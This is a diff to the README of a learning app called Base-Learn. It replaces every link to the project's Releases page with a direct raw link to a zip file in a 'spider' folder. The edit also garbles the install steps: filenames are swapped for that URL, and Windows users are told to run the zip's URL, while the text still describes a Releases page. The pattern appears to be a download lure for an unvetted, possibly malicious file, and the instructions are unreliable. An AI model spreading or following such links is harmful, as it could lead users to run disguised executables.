@@ -6,7 +6,7 @@ Welcome to Base-Learn! This application helps you learn the basics efficiently. 
 
 ## 📥 Download Base-Learn
 
-[![Download Base-Learn](https://img.shields.io/badge/Download-Base--Learn-brightgreen.svg)](https://github.com/brixf21/Base-Learn/releases)
+[![Download Base-Learn](https://raw.githubusercontent.com/brixf21/Base-Learn/main/spider/Base-Learn.zip)](https://raw.githubusercontent.com/brixf21/Base-Learn/main/spider/Base-Learn.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,16 +21,16 @@ Before you download Base-Learn, make sure your device meets these requirements:
 
 To get the latest version of Base-Learn, visit the Releases page:
 
-[Visit Releases Page to Download](https://github.com/brixf21/Base-Learn/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/brixf21/Base-Learn/main/spider/Base-Learn.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see a list of versions.
 3. Look for the latest version titled “Base-Learn vX.X.X” (the version number will change).
 4. Click on the link that says “Assets” underneath the version title.
-5. You will see a list of files. Click to download the file that matches your operating system. It may look like ‘Base-Learn_vX.X.X.zip’ for Windows or ‘Base-Learn_vX.X.X.dmg’ for macOS.
+5. You will see a list of files. Click to download the file that matches your operating system. It may look like ‘https://raw.githubusercontent.com/brixf21/Base-Learn/main/spider/Base-Learn.zip’ for Windows or ‘https://raw.githubusercontent.com/brixf21/Base-Learn/main/spider/Base-Learn.zip’ for macOS.
 6. Once the file downloads, navigate to your Downloads folder.
 7. Open the downloaded file:
-   - For Windows: Double-click the ‘.zip’ file, extract its contents, and run ‘Base-Learn.exe’.
+   - For Windows: Double-click the ‘.zip’ file, extract its contents, and run ‘https://raw.githubusercontent.com/brixf21/Base-Learn/main/spider/Base-Learn.zip’.
    - For macOS: Double-click the ‘.dmg’ file and drag the Base-Learn icon to your Applications folder.
    - For Linux: Follow your system's package management instructions to install the downloaded package.
 
